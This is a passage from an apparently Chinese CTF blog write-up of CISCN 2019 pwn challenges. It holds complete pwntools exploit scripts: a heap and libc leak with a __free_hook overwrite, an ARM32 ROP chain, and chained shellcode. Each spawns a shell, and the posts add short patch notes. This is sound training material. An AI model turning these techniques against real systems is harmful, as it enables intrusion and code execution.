class="keyword">def</span> <span class="title function_">recruit</span>(<span class="params">size,namesize=[],name=[]</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Give me your choice:\n&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">&#x27;How many servents do you want to rescruit?\n&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> size&lt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        ru(<span class="string">&#x27;Input the name\&#x27;s size of this servent:&#x27;</span>)</span><br><span class="line">        sel(<span class="built_in">str</span>(namesize[i]))</span><br><span class="line">        ru(<span class="string">&quot;Input the name of this servent:&quot;</span>)</span><br><span class="line">        se(name[i])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">expel</span>(<span class="params">index</span>):</span><br><span class="line">            sel(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">            ru(<span class="string">&quot;Tell me his index number:\n&quot;</span>)</span><br><span class="line">            sel(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">choice</span>):</span><br><span class="line">                ru(<span class="string">&#x27;Give me your choice:\n&#x27;</span>)</span><br><span class="line">                sel(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">                ru(<span class="string">&#x27;2.Excalibur      --90000yuan\n&#x27;</span>)</span><br><span class="line">                sel(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">order=[]</span>):</span><br><span class="line">                    command = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                    <span class="keyword">for</span> item <span class="keyword">in</span> order:</span><br><span class="line">                        command += <span class="built_in">str</span>(item)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">                        log.info(<span class="string">&#x27;gdb command:\n&#x27;</span>+command)</span><br><span class="line">                        gdb.attach(io,command)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">flag</span>):</span><br><span class="line">                            ru(<span class="string">&#x27;How much money do you want?\n&#x27;</span>)</span><br><span class="line">                            sel(<span class="built_in">str</span>(<span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line">                            recruit(-<span class="number">100000</span>)</span><br><span class="line">                            buy(<span class="number">2</span>)</span><br><span class="line">                            <span class="comment">#leaking heap</span></span><br><span class="line">                            recruit(<span class="number">4</span>,[<span class="number">0x18</span>,<span class="number">0x18</span>,<span class="number">0x18</span>,<span class="number">0x18</span>],[p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>),<span class="string">&#x27;\0&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>])</span><br><span class="line">                            sleep(<span class="number">0.5</span>)</span><br><span class="line">                            expel(<span class="number">1</span>)</span><br><span class="line">                            expel(<span class="number">2</span>)</span><br><span class="line">                            recruit(<span class="number">1</span>,[<span class="number">0x18</span>],[p64(<span class="number">0</span>)+p64(<span class="number">10000</span>)])</span><br><span class="line">                            sleep(<span class="number">0.5</span>)</span><br><span class="line">                            expel(<span class="number">3</span>)</span><br><span class="line">                            expel(<span class="number">1</span>)</span><br><span class="line">                            expel(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">                            io.recvuntil(<span class="string">&quot;Ok, I&#x27;ll kill &quot;</span>)</span><br><span class="line">                            heap = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0xc0</span></span><br><span class="line">                            log.info(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">                            <span class="comment"># leaking libc</span></span><br><span class="line">                            expel(<span class="number">1</span>)</span><br><span class="line">                            expel(<span class="number">3</span>)</span><br><span class="line">                            recruit(<span class="number">3</span>,[<span class="number">0x18</span>,<span class="number">0x28</span>,<span class="number">0x18</span>],[p64(heap+<span class="number">0x30</span>)+p64(<span class="number">100000</span>),<span class="string">&#x27;\0&#x27;</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)])</span><br><span class="line">                            sleep(<span class="number">0.5</span>)</span><br><span class="line">                            expel(<span class="number">1</span>)</span><br><span class="line">                            expel(<span class="number">3</span>)</span><br><span class="line">                            io.recvuntil(<span class="string">&quot;Ok, I&#x27;ll kill &quot;</span>)</span><br><span class="line">                            libc.address = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">                            log.info(<span class="string">&quot;libc.address:&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">                            _IO_2_1_stdin_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">                            log.info(<span class="string">&#x27;_IO_2_1_stdin_:&#x27;</span>+<span class="built_in">hex</span>(_IO_2_1_stdin_))</span><br><span class="line">                            __free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">                            log.info(<span class="string">&quot;_free_hook:&quot;</span>+<span class="built_in">hex</span>(__free_hook))</span><br><span class="line"></span><br><span class="line">                            expel(<span class="number">6</span>)</span><br><span class="line">                            expel(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">                            <span class="comment"># calculate monster&#x27;s blood, Fxxk 666</span></span><br><span class="line">                            temp = <span class="number">2</span>*(libc.address+<span class="number">0x3c4b78</span>)&amp;<span class="number">0xffffffff</span></span><br><span class="line">                            <span class="keyword">if</span> temp&gt;<span class="number">0xffffffff</span>:</span><br><span class="line">                                temp = temp&amp;<span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> <span class="number">9990</span>-temp &lt;<span class="number">0</span>:</span><br><span class="line">                                    y = <span class="number">0xffffffff</span>+<span class="number">9990</span>-temp</span><br><span class="line"></span><br><span class="line">                                    <span class="keyword">if</span> y%<span class="number">3</span>!=<span class="number">0</span>:</span><br><span class="line">                                        y = y+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                                        <span class="keyword">if</span> y%<span class="number">3</span>!=<span class="number">0</span>:</span><br><span class="line">                                            y = y+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                                            x = y/<span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                            recruit(<span class="number">1</span>,[<span class="number">0x18</span>],[p64(<span class="number">0x0</span>)+p64(x)])</span><br><span class="line">                                            <span class="comment"># write _IO_2_1_stdin_ _IO_buf_base</span></span><br><span class="line"></span><br><span class="line">                                            <span class="comment">#z([&#x27;b *&#x27;+hex(proc_base+0x1205),</span></span><br><span class="line">                                            <span class="comment">#   &#x27;b *&#x27;+hex(proc_base+0x1134)])</span></span><br><span class="line"></span><br><span class="line">                                            ru(<span class="string">&#x27;Give me your choice:\n&#x27;</span>)</span><br><span class="line">                                            sel(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">                                            ru(<span class="string">&#x27;Do you want to use excalibur?\n&#x27;</span>)</span><br><span class="line">                                            sel(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">                                            ru(<span class="string">&#x27;Where do you want to wipe out?&#x27;</span>)</span><br><span class="line">                                            sel(<span class="built_in">str</span>(_IO_2_1_stdin_+<span class="number">0x38</span>))</span><br><span class="line">                                            ru(<span class="string">&#x27;How much power do you want to use?(0-8)&#x27;</span>)</span><br><span class="line">                                            sel(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">                                            ru(<span class="string">&#x27;Leave your name please:\n&#x27;</span>)</span><br><span class="line">                                            sel(<span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">                                                +p64(__free_hook)*<span class="number">3</span>+p64(libc.address+<span class="number">0x3c67c8</span>)+<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x3c</span>+p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">                                            io.interactive()</span><br><span class="line"></span><br><span class="line">                                            <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">                                                context.binary = <span class="string">&#x27;./kindom&#x27;</span></span><br><span class="line">                                                context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;136&#x27;</span>]</span><br><span class="line">                                                <span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">                                                elf = ELF(<span class="string">&#x27;./kindom&#x27;</span>)</span><br><span class="line">                                                <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">                                                    io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">                                                    libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">                                                    exploit(<span class="number">0</span>)</span><br><span class="line">                                                <span class="keyword">else</span>:</span><br><span class="line">                                                    io = process(<span class="string">&#x27;./kindom&#x27;</span>)</span><br><span class="line">                                                    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">                                                    proc_base = io.libs()[<span class="string">&#x27;/ctf/work/CTFPro/2019/ciscn2019-area/day2/pwn7-kingdom/kindom&#x27;</span>]</span><br><span class="line">                                                    log.info(<span class="string">&#x27;proc_base:&#x27;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line">                                                    libc_base= io.libs()[<span class="string">&#x27;/lib/x86_64-linux-gnu/ld-2.23.so&#x27;</span>]</span><br><span class="line">                                                    log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">                                                    exploit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h3 id="pwn8-attach-❌"><a href="#pwn8-attach-❌" class="headerlink" title="pwn8-attach ❌"></a>pwn8-attach ❌</h3><p>惊现ARM-32bit的题目，是一个ARM32下的简单ROP 注意两点:</p>
<ol>
<li>熟悉ARM，MIPS，PPC等题目环境的迅速搭建</li>
<li>熟悉ARM汇编，注意ARM指令，学会在ARM下构造ROP Chain</li>
</ol>
<p>题目本身比较简单，但是没做出来就比较尴尬了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&quot;./attach&quot;</span></span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">10002</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./attach&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">io = remote(host,port)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;your name:\n\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x24</span></span><br><span class="line">payload += p32(<span class="number">0x103a4</span>) <span class="comment"># 0x000103a4: pop &#123;r3, pc&#125;;</span></span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0x10638</span>) <span class="comment"># 0x00010638: pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;;</span></span><br><span class="line">payload += <span class="number">3</span>*p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += <span class="number">3</span>*p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x00010628</span>) <span class="comment"># 0x00010628: mov r0, r7; blx r3;</span></span><br><span class="line">payload += <span class="number">7</span>*p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x010590</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">libc.address = u32(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">0x4</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;binsh:&#x27;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x24</span></span><br><span class="line">payload += p32(<span class="number">0x103a4</span>) <span class="comment"># 0x000103a4: pop &#123;r3, pc&#125;;</span></span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(<span class="number">0x10638</span>) <span class="comment"># 0x00010638: pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;;</span></span><br><span class="line">payload += <span class="number">3</span>*p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">payload += <span class="number">3</span>*p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x00010628</span>) <span class="comment"># 0x00010628: mov r0, r7; blx r3;</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>PATCH: 修改<code>read</code>读入的长度防止栈溢出</p>
<h3 id="pwn9-moneygame-✅"><a href="#pwn9-moneygame-✅" class="headerlink" title="pwn9-moneygame ✅"></a>pwn9-moneygame ✅</h3><p>checksec 发现有rwx的段，通过<code>jmp &quot;\xeb\x04&quot;</code> 在堆空间中构造shellcode并执行即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line">rufd = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">False</span>)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">se = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sel = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x:io.sendafter(x)</span><br><span class="line">sela = <span class="keyword">lambda</span> x:io.sendlineafter(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">charge</span>(<span class="params">money</span>):</span><br><span class="line">    ru(<span class="string">&quot;Your choice:\n&quot;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">&#x27;Money makes you stronger:\n&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">name</span>):</span><br><span class="line">        ru(<span class="string">&quot;Your choice:\n&quot;</span>)</span><br><span class="line">        sel(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        ru(<span class="string">&#x27;input WeaponName:&#x27;</span>)</span><br><span class="line">        se(name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">wid,name</span>):</span><br><span class="line">            ru(<span class="string">&quot;Your choice:\n&quot;</span>)</span><br><span class="line">            sel(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">            ru(<span class="string">&#x27;change Weapon id:&#x27;</span>)</span><br><span class="line">            sel(<span class="built_in">str</span>(wid))</span><br><span class="line">            ru(<span class="string">&#x27;new Name:&#x27;</span>)</span><br><span class="line">            se(name)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">wid</span>):</span><br><span class="line">                ru(<span class="string">&quot;Your choice:\n&quot;</span>)</span><br><span class="line">                sel(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">                ru(<span class="string">&#x27;Which Weapon do you want to show?\n&#x27;</span>)</span><br><span class="line">                sel(<span class="built_in">str</span>(wid))</span><br><span class="line"></span><br><span class="line">                <span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">order=[]</span>):</span><br><span class="line">                    command = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                    <span class="keyword">for</span> item <span class="keyword">in</span> order:</span><br><span class="line">                        command += <span class="built_in">str</span>(item)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">                        log.info(<span class="string">&#x27;gdb command:\n&#x27;</span>+command)</span><br><span class="line">                        gdb.attach(io,command)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">flag</span>):</span><br><span class="line">                            charge(-<span class="number">500</span>)</span><br><span class="line">                            edit(<span class="number">20</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">                            show(-<span class="number">1</span>)</span><br><span class="line">                            ru(<span class="string">&#x27;Weapon name is:&#x27;</span>)</span><br><span class="line">                            proc = u64(rud(<span class="string">&#x27;\n&#x27;</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x203DB8</span></span><br><span class="line">                            log.info(<span class="string">&#x27;proc:&#x27;</span>+<span class="built_in">hex</span>(proc))</span><br><span class="line"></span><br><span class="line">                            <span class="comment"># shellcode = asm(shellcraft.linux.sh())</span></span><br><span class="line">                            <span class="comment"># print len(asm(&quot;movabs rax, 0x68732f6e69622f&quot;))</span></span><br><span class="line"></span><br><span class="line">                            payload = asm(<span class="string">&quot;add rax,0xf0&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">0</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;mov rax, [rax]&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">1</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;push rax&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">2</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;push 0x3b&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">3</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;pop rax&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">4</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;push 0x0&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">5</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;pop rsi&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">6</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;push 0x0&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">7</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;pop rdx&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">8</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;mov rdi,rsp&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">9</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;syscall&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">10</span>,payload)</span><br><span class="line"></span><br><span class="line">                            <span class="comment"># z([&#x27;b *&#x27;+hex(proc_base+0x12D0)])</span></span><br><span class="line">                            edit(-<span class="number">1</span>,p64(proc+<span class="number">0x204088</span>))</span><br><span class="line"></span><br><span class="line">                            ru(<span class="string">&quot;Your choice:\n&quot;</span>)</span><br><span class="line">                            sel(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">                            io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">                                context.binary = <span class="string">&#x27;./moneygame&#x27;</span></span><br><span class="line">                                context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;115&#x27;</span>]</span><br><span class="line">                                context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">                                elf = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">                                <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">                                    io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">                                    libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">                                    exploit(<span class="number">0</span>)</span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    io = process(<span class="string">&#x27;./moneygame&#x27;</span>)</span><br><span class="line">                                    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">                                    <span class="comment"># print io.libs()</span></span><br><span class="line">                                    proc_base = io.libs()[<span class="string">&#x27;/ctf/work/CTFPro/2019/ciscn2019-area/PWN/moneygame&#x27;</span>]</span><br><span class="line">                                    log.info(<span class="string">&#x27;proc_base:&#x27;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line">                                    libc_base= io.libs()[<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>]</span><br><span class="line">                                    log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">                                    exploit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>patch: 修改函数0xF50，防止输入负数造成越界写</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/11/19/ciscn2019%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E5%8C%BA%E5%9F%9F%E8%B5%9B/" data-id="cuidDvD-uvvivMd5qybX2lKAz" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-cakectf2022" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/11/19/cakectf2022/" class="article-date">
  <time class="dt-published" datetime="2025-11-19T12:59:10.788Z" itemprop="datePublished">2025-11-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
